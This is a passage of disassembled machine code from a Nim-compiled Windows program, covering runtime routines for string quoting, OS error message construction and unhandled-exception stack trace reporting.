  404b35:	e9 0a 01 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404b3a:	80 fa 5c             	cmp    $0x5c,%dl
  404b3d:	0f 84 cb 00 00 00    	je     404c0e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x258>
  404b43:	80 fa 7e             	cmp    $0x7e,%dl
  404b46:	0f 8f 02 01 00 00    	jg     404c4e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x298>
  404b4c:	e9 4a 01 00 00       	jmp    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404b51:	ba 02 00 00 00       	mov    $0x2,%edx
  404b56:	e8 4c fa ff ff       	call   4045a7 <resizeString>
  404b5b:	48 89 d9             	mov    %rbx,%rcx
  404b5e:	48 89 c2             	mov    %rax,%rdx
  404b61:	e8 5c e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404b66:	48 8d 15 23 c7 00 00 	lea    0xc723(%rip),%rdx        # 411290 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_17>
  404b6d:	e9 d2 00 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404b72:	ba 02 00 00 00       	mov    $0x2,%edx
  404b77:	e8 2b fa ff ff       	call   4045a7 <resizeString>
  404b7c:	48 89 d9             	mov    %rbx,%rcx
  404b7f:	48 89 c2             	mov    %rax,%rdx
  404b82:	e8 3b e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404b87:	48 8d 15 e2 c6 00 00 	lea    0xc6e2(%rip),%rdx        # 411270 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_18>
  404b8e:	e9 b1 00 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404b93:	ba 02 00 00 00       	mov    $0x2,%edx
  404b98:	e8 0a fa ff ff       	call   4045a7 <resizeString>
  404b9d:	48 89 d9             	mov    %rbx,%rcx
  404ba0:	48 89 c2             	mov    %rax,%rdx
  404ba3:	e8 1a e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404ba8:	48 8d 15 a1 c6 00 00 	lea    0xc6a1(%rip),%rdx        # 411250 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_19>
  404baf:	e9 90 00 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404bb4:	ba 02 00 00 00       	mov    $0x2,%edx
  404bb9:	e8 e9 f9 ff ff       	call   4045a7 <resizeString>
  404bbe:	48 89 d9             	mov    %rbx,%rcx
  404bc1:	48 89 c2             	mov    %rax,%rdx
  404bc4:	e8 f9 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404bc9:	48 8d 15 60 c6 00 00 	lea    0xc660(%rip),%rdx        # 411230 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_20>
  404bd0:	eb 72                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404bd2:	ba 02 00 00 00       	mov    $0x2,%edx
  404bd7:	e8 cb f9 ff ff       	call   4045a7 <resizeString>
  404bdc:	48 89 d9             	mov    %rbx,%rcx
  404bdf:	48 89 c2             	mov    %rax,%rdx
  404be2:	e8 db e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404be7:	48 8d 15 22 c6 00 00 	lea    0xc622(%rip),%rdx        # 411210 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_21>
  404bee:	eb 54                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404bf0:	ba 02 00 00 00       	mov    $0x2,%edx
  404bf5:	e8 ad f9 ff ff       	call   4045a7 <resizeString>
  404bfa:	48 89 d9             	mov    %rbx,%rcx
  404bfd:	48 89 c2             	mov    %rax,%rdx
  404c00:	e8 bd e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c05:	48 8d 15 e4 c5 00 00 	lea    0xc5e4(%rip),%rdx        # 4111f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_22>
  404c0c:	eb 36                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404c0e:	ba 02 00 00 00       	mov    $0x2,%edx
  404c13:	e8 8f f9 ff ff       	call   4045a7 <resizeString>
  404c18:	48 89 d9             	mov    %rbx,%rcx
  404c1b:	48 89 c2             	mov    %rax,%rdx
  404c1e:	e8 9f e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c23:	4c 89 fa             	mov    %r15,%rdx
  404c26:	eb 1c                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404c28:	ba 02 00 00 00       	mov    $0x2,%edx
  404c2d:	e8 75 f9 ff ff       	call   4045a7 <resizeString>
  404c32:	48 89 d9             	mov    %rbx,%rcx
  404c35:	48 89 c2             	mov    %rax,%rdx
  404c38:	e8 85 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c3d:	48 8d 15 4c c5 00 00 	lea    0xc54c(%rip),%rdx        # 411190 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_25>
  404c44:	48 8b 0b             	mov    (%rbx),%rcx
  404c47:	e8 31 cd ff ff       	call   40197d <appendString.part.0>
  404c4c:	eb 5d                	jmp    404cab <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2f5>
  404c4e:	ba 02 00 00 00       	mov    $0x2,%edx
  404c53:	e8 4f f9 ff ff       	call   4045a7 <resizeString>
  404c58:	48 89 d9             	mov    %rbx,%rcx
  404c5b:	48 89 c2             	mov    %rax,%rdx
  404c5e:	e8 5f e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c63:	48 8b 0b             	mov    (%rbx),%rcx
  404c66:	4c 89 f2             	mov    %r14,%rdx
  404c69:	e8 0f cd ff ff       	call   40197d <appendString.part.0>
  404c6e:	48 0f be c6          	movsbq %sil,%rax
  404c72:	48 8b 0b             	mov    (%rbx),%rcx
  404c75:	83 e6 0f             	and    $0xf,%esi
  404c78:	48 c1 f8 04          	sar    $0x4,%rax
  404c7c:	41 0f be 54 04 10    	movsbl 0x10(%r12,%rax,1),%edx
  404c82:	e8 43 f6 ff ff       	call   4042ca <addChar>
  404c87:	48 89 d9             	mov    %rbx,%rcx
  404c8a:	48 89 c2             	mov    %rax,%rdx
  404c8d:	e8 30 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c92:	41 0f be 54 34 10    	movsbl 0x10(%r12,%rsi,1),%edx
  404c98:	48 8b 0b             	mov    (%rbx),%rcx
  404c9b:	e8 2a f6 ff ff       	call   4042ca <addChar>
  404ca0:	48 89 d9             	mov    %rbx,%rcx
  404ca3:	48 89 c2             	mov    %rax,%rdx
  404ca6:	e8 17 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404cab:	48 ff c7             	inc    %rdi
  404cae:	e9 97 fd ff ff       	jmp    404a4a <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x94>

0000000000404cb3 <newOSError__JXEuze9ctNbkn51HYBflQLg>:
  404cb3:	55                   	push   %rbp
  404cb4:	57                   	push   %rdi
  404cb5:	56                   	push   %rsi
  404cb6:	53                   	push   %rbx
  404cb7:	48 83 ec 58          	sub    $0x58,%rsp
  404cbb:	31 ed                	xor    %ebp,%ebp
  404cbd:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%rsp)
  404cc4:	48 89 d7             	mov    %rdx,%rdi
  404cc7:	ba 38 00 00 00       	mov    $0x38,%edx
  404ccc:	48 8d 0d ad 06 02 00 	lea    0x206ad(%rip),%rcx        # 425380 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_>
  404cd3:	e8 0e f0 ff ff       	call   403ce6 <newObj>
  404cd8:	44 8b 84 24 80 00 00 	mov    0x80(%rsp),%r8d
  404cdf:	00 
  404ce0:	48 89 c3             	mov    %rax,%rbx
  404ce3:	48 8d 05 16 07 02 00 	lea    0x20716(%rip),%rax        # 425400 <NTI__BeJgrOdDsczOwEWOZbRfKA_>
  404cea:	48 89 03             	mov    %rax,(%rbx)
  404ced:	48 8d 05 e6 73 00 00 	lea    0x73e6(%rip),%rax        # 40c0da <.rdata+0xda>
  404cf4:	45 85 c0             	test   %r8d,%r8d
  404cf7:	48 89 43 10          	mov    %rax,0x10(%rbx)
  404cfb:	44 89 43 30          	mov    %r8d,0x30(%rbx)
  404cff:	74 5c                	je     404d5d <newOSError__JXEuze9ctNbkn51HYBflQLg+0xaa>
  404d01:	45 31 c9             	xor    %r9d,%r9d
  404d04:	31 d2                	xor    %edx,%edx
  404d06:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  404d0d:	00 
  404d0e:	31 ed                	xor    %ebp,%ebp
  404d10:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  404d15:	b9 00 13 00 00       	mov    $0x1300,%ecx
  404d1a:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
  404d21:	00 00 
  404d23:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404d2a:	00 00 
  404d2c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404d31:	ff 15 01 4f 02 00    	call   *0x24f01(%rip)        # 429c38 <Dl_14036835_>
  404d37:	85 c0                	test   %eax,%eax
  404d39:	74 22                	je     404d5d <newOSError__JXEuze9ctNbkn51HYBflQLg+0xaa>
  404d3b:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
  404d40:	ba 50 00 00 00       	mov    $0x50,%edx
  404d45:	e8 07 f6 ff ff       	call   404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43>
  404d4a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
  404d4f:	48 89 c5             	mov    %rax,%rbp
  404d52:	48 85 c9             	test   %rcx,%rcx
  404d55:	74 06                	je     404d5d <newOSError__JXEuze9ctNbkn51HYBflQLg+0xaa>
  404d57:	ff 15 d3 4e 02 00    	call   *0x24ed3(%rip)        # 429c30 <Dl_14037001_>
  404d5d:	48 8d 73 18          	lea    0x18(%rbx),%rsi
  404d61:	48 89 ea             	mov    %rbp,%rdx
  404d64:	48 89 f1             	mov    %rsi,%rcx
  404d67:	e8 94 e1 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  404d6c:	48 85 ff             	test   %rdi,%rdi
  404d6f:	74 67                	je     404dd8 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x125>
  404d71:	48 83 3f 00          	cmpq   $0x0,(%rdi)
  404d75:	7e 61                	jle    404dd8 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x125>
  404d77:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  404d7b:	48 85 c9             	test   %rcx,%rcx
  404d7e:	74 24                	je     404da4 <newOSError__JXEuze9ctNbkn51HYBflQLg+0xf1>
  404d80:	48 8b 01             	mov    (%rcx),%rax
  404d83:	48 85 c0             	test   %rax,%rax
  404d86:	7e 1c                	jle    404da4 <newOSError__JXEuze9ctNbkn51HYBflQLg+0xf1>
  404d88:	80 7c 01 0f 0a       	cmpb   $0xa,0xf(%rcx,%rax,1)
  404d8d:	74 15                	je     404da4 <newOSError__JXEuze9ctNbkn51HYBflQLg+0xf1>
  404d8f:	ba 0a 00 00 00       	mov    $0xa,%edx
  404d94:	e8 31 f5 ff ff       	call   4042ca <addChar>
  404d99:	48 89 f1             	mov    %rsi,%rcx
  404d9c:	48 89 c2             	mov    %rax,%rdx
  404d9f:	e8 5c e1 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  404da4:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  404da8:	ba 11 00 00 00       	mov    $0x11,%edx
  404dad:	e8 f5 f7 ff ff       	call   4045a7 <resizeString>
  404db2:	48 89 f1             	mov    %rsi,%rcx
  404db5:	48 89 c2             	mov    %rax,%rdx
  404db8:	e8 43 e1 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  404dbd:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  404dc1:	48 8d 15 78 c5 00 00 	lea    0xc578(%rip),%rdx        # 411340 <TM__yu6cxgKBBXbNsTkT9cyMd4g_4>
  404dc8:	e8 b0 cb ff ff       	call   40197d <appendString.part.0>
  404dcd:	48 89 fa             	mov    %rdi,%rdx
  404dd0:	48 89 f1             	mov    %rsi,%rcx
  404dd3:	e8 de fb ff ff       	call   4049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>
  404dd8:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  404ddc:	48 85 f6             	test   %rsi,%rsi
  404ddf:	74 06                	je     404de7 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x134>
  404de1:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  404de5:	75 1d                	jne    404e04 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x151>
  404de7:	48 8d 0d 12 c5 00 00 	lea    0xc512(%rip),%rcx        # 411300 <TM__yu6cxgKBBXbNsTkT9cyMd4g_5>
  404dee:	e8 4d ee ff ff       	call   403c40 <copyStringRC1>
  404df3:	48 85 f6             	test   %rsi,%rsi
  404df6:	48 89 43 18          	mov    %rax,0x18(%rbx)
  404dfa:	74 08                	je     404e04 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x151>
  404dfc:	48 89 f1             	mov    %rsi,%rcx
  404dff:	e8 2d e1 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  404e04:	48 89 d8             	mov    %rbx,%rax
  404e07:	48 83 c4 58          	add    $0x58,%rsp
  404e0b:	5b                   	pop    %rbx
  404e0c:	5e                   	pop    %rsi
  404e0d:	5f                   	pop    %rdi
  404e0e:	5d                   	pop    %rbp
  404e0f:	c3                   	ret

0000000000404e10 <cstrToNimstr>:
  404e10:	57                   	push   %rdi
  404e11:	56                   	push   %rsi
  404e12:	53                   	push   %rbx
  404e13:	48 83 ec 20          	sub    $0x20,%rsp
  404e17:	31 c0                	xor    %eax,%eax
  404e19:	48 85 c9             	test   %rcx,%rcx
  404e1c:	48 89 ce             	mov    %rcx,%rsi
  404e1f:	74 2a                	je     404e4b <cstrToNimstr+0x3b>
  404e21:	48 89 f7             	mov    %rsi,%rdi
  404e24:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  404e28:	f2 ae                	repnz scas (%rdi),%al
  404e2a:	48 89 cb             	mov    %rcx,%rbx
  404e2d:	48 f7 d3             	not    %rbx
  404e30:	48 8d 7b ff          	lea    -0x1(%rbx),%rdi
  404e34:	48 89 f9             	mov    %rdi,%rcx
  404e37:	e8 17 f2 ff ff       	call   404053 <rawNewStringNoInit>
  404e3c:	48 89 d9             	mov    %rbx,%rcx
  404e3f:	48 8d 50 10          	lea    0x10(%rax),%rdx
  404e43:	48 89 38             	mov    %rdi,(%rax)
  404e46:	48 89 d7             	mov    %rdx,%rdi
  404e49:	f3 a4                	rep movsb (%rsi),(%rdi)
  404e4b:	48 83 c4 20          	add    $0x20,%rsp
  404e4f:	5b                   	pop    %rbx
  404e50:	5e                   	pop    %rsi
  404e51:	5f                   	pop    %rdi
  404e52:	c3                   	ret

0000000000404e53 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3>:
  404e53:	41 57                	push   %r15
  404e55:	41 56                	push   %r14
  404e57:	41 55                	push   %r13
  404e59:	41 54                	push   %r12
  404e5b:	55                   	push   %rbp
  404e5c:	57                   	push   %rdi
  404e5d:	56                   	push   %rsi
  404e5e:	53                   	push   %rbx
  404e5f:	48 81 ec 18 08 00 00 	sub    $0x818,%rsp
  404e66:	ba d1 07 00 00       	mov    $0x7d1,%edx
  404e6b:	48 8d 6c 24 3f       	lea    0x3f(%rsp),%rbp
  404e70:	49 89 cc             	mov    %rcx,%r12
  404e73:	48 89 e9             	mov    %rbp,%rcx
  404e76:	e8 47 cb ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  404e7b:	49 8b 5c 24 20       	mov    0x20(%r12),%rbx
  404e80:	48 85 db             	test   %rbx,%rbx
  404e83:	75 07                	jne    404e8c <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x39>
  404e85:	31 d2                	xor    %edx,%edx
  404e87:	e9 da 01 00 00       	jmp    405066 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x213>
  404e8c:	48 83 3b 00          	cmpq   $0x0,(%rbx)
  404e90:	74 f3                	je     404e85 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x32>
  404e92:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
  404e97:	48 83 c3 10          	add    $0x10,%rbx
  404e9b:	31 f6                	xor    %esi,%esi
  404e9d:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404ea4:	00 00 
  404ea6:	e8 a1 ee ff ff       	call   403d4c <rawNewString>
  404eab:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  404eb0:	41 bf 01 00 00 00    	mov    $0x1,%r15d
  404eb6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404ebb:	48 8b 43 f0          	mov    -0x10(%rbx),%rax
  404ebf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404ec4:	48 39 74 24 28       	cmp    %rsi,0x28(%rsp)
  404ec9:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
  404ece:	7f 10                	jg     404ee0 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x8d>
  404ed0:	31 d2                	xor    %edx,%edx
  404ed2:	4d 85 c0             	test   %r8,%r8
  404ed5:	0f 85 53 01 00 00    	jne    40502e <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1db>
  404edb:	e9 5e 01 00 00       	jmp    40503e <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1eb>
  404ee0:	48 8b 43 08          	mov    0x8(%rbx),%rax
  404ee4:	48 83 f8 f6          	cmp    $0xfffffffffffffff6,%rax
  404ee8:	74 08                	je     404ef2 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x9f>
  404eea:	48 83 f8 9c          	cmp    $0xffffffffffffff9c,%rax
  404eee:	75 20                	jne    404f10 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xbd>
  404ef0:	eb 2b                	jmp    404f1d <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xca>
  404ef2:	ba 11 00 00 00       	mov    $0x11,%edx
  404ef7:	4c 89 c1             	mov    %r8,%rcx
  404efa:	e8 a8 f6 ff ff       	call   4045a7 <resizeString>
  404eff:	48 8d 15 9a c1 00 00 	lea    0xc19a(%rip),%rdx        # 4110a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_11>
  404f06:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f0b:	e9 0a 01 00 00       	jmp    40501a <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1c7>
  404f10:	45 31 ed             	xor    %r13d,%r13d
  404f13:	4d 85 c0             	test   %r8,%r8
  404f16:	74 23                	je     404f3b <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xe8>
  404f18:	4d 8b 28             	mov    (%r8),%r13
  404f1b:	eb 1e                	jmp    404f3b <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xe8>
  404f1d:	ba 03 00 00 00       	mov    $0x3,%edx
  404f22:	4c 89 c1             	mov    %r8,%rcx
  404f25:	e8 7d f6 ff ff       	call   4045a7 <resizeString>
  404f2a:	48 8d 15 3f c1 00 00 	lea    0xc13f(%rip),%rdx        # 411070 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_12>
  404f31:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f36:	e9 df 00 00 00       	jmp    40501a <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1c7>
  404f3b:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  404f3f:	48 85 d2             	test   %rdx,%rdx
  404f42:	74 08                	je     404f4c <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xf9>
  404f44:	48 89 f9             	mov    %rdi,%rcx
  404f47:	e8 28 f6 ff ff       	call   404574 <add__8FwY5enLGB0dFerO6Ny9caw.part.19>
  404f4c:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
  404f51:	7e 58                	jle    404fab <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x158>
  404f53:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f58:	ba 28 00 00 00       	mov    $0x28,%edx
  404f5d:	e8 68 f3 ff ff       	call   4042ca <addChar>
  404f62:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
  404f66:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f6b:	e8 3f f2 ff ff       	call   4041af <nimIntToStr>
  404f70:	31 d2                	xor    %edx,%edx
  404f72:	48 85 c0             	test   %rax,%rax
  404f75:	49 89 c6             	mov    %rax,%r14
  404f78:	74 03                	je     404f7d <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x12a>
  404f7a:	48 8b 10             	mov    (%rax),%rdx
  404f7d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f82:	e8 20 f6 ff ff       	call   4045a7 <resizeString>
  404f87:	4c 89 f2             	mov    %r14,%rdx
  404f8a:	48 89 c1             	mov    %rax,%rcx
  404f8d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f92:	e8 0c ca ff ff       	call   4019a3 <appendString.lto_priv.48>
  404f97:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f9c:	ba 29 00 00 00       	mov    $0x29,%edx
  404fa1:	e8 24 f3 ff ff       	call   4042ca <addChar>
  404fa6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404fab:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
  404fb0:	31 c0                	xor    %eax,%eax
  404fb2:	48 85 d2             	test   %rdx,%rdx
  404fb5:	74 03                	je     404fba <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x167>
  404fb7:	48 8b 02             	mov    (%rdx),%rax
  404fba:	4c 29 e8             	sub    %r13,%rax
  404fbd:	41 bd 19 00 00 00    	mov    $0x19,%r13d
  404fc3:	41 be 01 00 00 00    	mov    $0x1,%r14d
  404fc9:	49 29 c5             	sub    %rax,%r13
  404fcc:	4d 85 ed             	test   %r13,%r13
  404fcf:	4d 0f 4e ef          	cmovle %r15,%r13
  404fd3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404fd8:	ba 20 00 00 00       	mov    $0x20,%edx
  404fdd:	49 ff c6             	inc    %r14
  404fe0:	e8 e5 f2 ff ff       	call   4042ca <addChar>
  404fe5:	4d 39 f5             	cmp    %r14,%r13
  404fe8:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404fed:	7d e4                	jge    404fd3 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x180>
  404fef:	48 8b 13             	mov    (%rbx),%rdx
  404ff2:	48 85 d2             	test   %rdx,%rdx
  404ff5:	74 08                	je     404fff <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1ac>
  404ff7:	48 89 f9             	mov    %rdi,%rcx
  404ffa:	e8 75 f5 ff ff       	call   404574 <add__8FwY5enLGB0dFerO6Ny9caw.part.19>
  404fff:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  405004:	ba 01 00 00 00       	mov    $0x1,%edx
  405009:	e8 99 f5 ff ff       	call   4045a7 <resizeString>
  40500e:	48 8d 15 3b c0 00 00 	lea    0xc03b(%rip),%rdx        # 411050 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_13>
  405015:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  40501a:	48 89 c1             	mov    %rax,%rcx
  40501d:	48 ff c6             	inc    %rsi
  405020:	48 83 c3 18          	add    $0x18,%rbx
  405024:	e8 54 c9 ff ff       	call   40197d <appendString.part.0>
  405029:	e9 96 fe ff ff       	jmp    404ec4 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x71>
  40502e:	49 8b 10             	mov    (%r8),%rdx
  405031:	48 81 fa cf 07 00 00 	cmp    $0x7cf,%rdx
  405038:	0f 8f 47 fe ff ff    	jg     404e85 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x32>
  40503e:	4c 89 c1             	mov    %r8,%rcx
  405041:	48 89 ef             	mov    %rbp,%rdi
  405044:	e8 08 c5 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  405049:	4d 85 c0             	test   %r8,%r8
  40504c:	48 89 c6             	mov    %rax,%rsi
  40504f:	48 89 d1             	mov    %rdx,%rcx
  405052:	f3 a4                	rep movsb (%rsi),(%rdi)
  405054:	0f 84 2b fe ff ff    	je     404e85 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x32>
  40505a:	49 8b 10             	mov    (%r8),%rdx
  40505d:	48 81 fa b3 07 00 00 	cmp    $0x7b3,%rdx
  405064:	7f 1a                	jg     405080 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x22d>
  405066:	48 8d 44 15 00       	lea    0x0(%rbp,%rdx,1),%rax
  40506b:	b9 07 00 00 00       	mov    $0x7,%ecx
  405070:	48 83 c2 1c          	add    $0x1c,%rdx
  405074:	48 8d 35 67 70 00 00 	lea    0x7067(%rip),%rsi        # 40c0e2 <.rdata+0xe2>
  40507b:	48 89 c7             	mov    %rax,%rdi
  40507e:	f3 a5                	rep movsl (%rsi),(%rdi)
  405080:	4d 8b 4c 24 18       	mov    0x18(%r12),%r9
  405085:	45 31 c0             	xor    %r8d,%r8d
  405088:	4d 85 c9             	test   %r9,%r9
  40508b:	74 03                	je     405090 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x23d>
  40508d:	4d 8b 01             	mov    (%r9),%r8
  405090:	4a 8d 04 02          	lea    (%rdx,%r8,1),%rax
  405094:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
  40509a:	7f 25                	jg     4050c1 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x26e>
  40509c:	4c 89 c9             	mov    %r9,%rcx
  40509f:	e8 ad c4 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  4050a4:	48 89 c6             	mov    %rax,%rsi
  4050a7:	4c 89 c1             	mov    %r8,%rcx
  4050aa:	48 8d 44 15 00       	lea    0x0(%rbp,%rdx,1),%rax
  4050af:	48 89 c7             	mov    %rax,%rdi
  4050b2:	31 c0                	xor    %eax,%eax
  4050b4:	4d 85 c9             	test   %r9,%r9
  4050b7:	f3 a4                	rep movsb (%rsi),(%rdi)
  4050b9:	74 03                	je     4050be <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x26b>
  4050bb:	49 8b 01             	mov    (%r9),%rax
  4050be:	48 01 c2             	add    %rax,%rdx
  4050c1:	48 81 fa cd 07 00 00 	cmp    $0x7cd,%rdx
  4050c8:	7f 0b                	jg     4050d5 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x282>
  4050ca:	66 c7 44 15 00 20 5b 	movw   $0x5b20,0x0(%rbp,%rdx,1)
  4050d1:	48 83 c2 02          	add    $0x2,%rdx
  4050d5:	4d 8b 44 24 10       	mov    0x10(%r12),%r8
  4050da:	31 c9                	xor    %ecx,%ecx
  4050dc:	4d 85 c0             	test   %r8,%r8
  4050df:	74 17                	je     4050f8 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x2a5>
  4050e1:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  4050e5:	31 c0                	xor    %eax,%eax
  4050e7:	4c 89 c7             	mov    %r8,%rdi
  4050ea:	f2 ae                	repnz scas (%rdi),%al
  4050ec:	48 89 cb             	mov    %rcx,%rbx
  4050ef:	48 f7 d3             	not    %rbx
  4050f2:	48 89 d9             	mov    %rbx,%rcx
  4050f5:	48 ff c9             	dec    %rcx
  4050f8:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
  4050fc:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
  405102:	7f 23                	jg     405127 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x2d4>
  405104:	48 8d 44 15 00       	lea    0x0(%rbp,%rdx,1),%rax
  405109:	4c 89 c6             	mov    %r8,%rsi
  40510c:	48 89 c7             	mov    %rax,%rdi
  40510f:	31 c0                	xor    %eax,%eax
  405111:	f3 a4                	rep movsb (%rsi),(%rdi)
  405113:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  405117:	4c 89 c7             	mov    %r8,%rdi
  40511a:	f2 ae                	repnz scas (%rdi),%al
  40511c:	48 89 c8             	mov    %rcx,%rax
  40511f:	48 f7 d0             	not    %rax
  405122:	48 8d 54 02 ff       	lea    -0x1(%rdx,%rax,1),%rdx
  405127:	48 81 fa cd 07 00 00 	cmp    $0x7cd,%rdx
  40512e:	7f 07                	jg     405137 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x2e4>
  405130:	66 c7 44 15 00 5d 0a 	movw   $0xa5d,0x0(%rbp,%rdx,1)
  405137:	48 89 e9             	mov    %rbp,%rcx
  40513a:	e8 8d 04 00 00       	call   4055cc <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw>
  40513f:	90                   	nop
  405140:	48 81 c4 18 08 00 00 	add    $0x818,%rsp
  405147:	5b                   	pop    %rbx
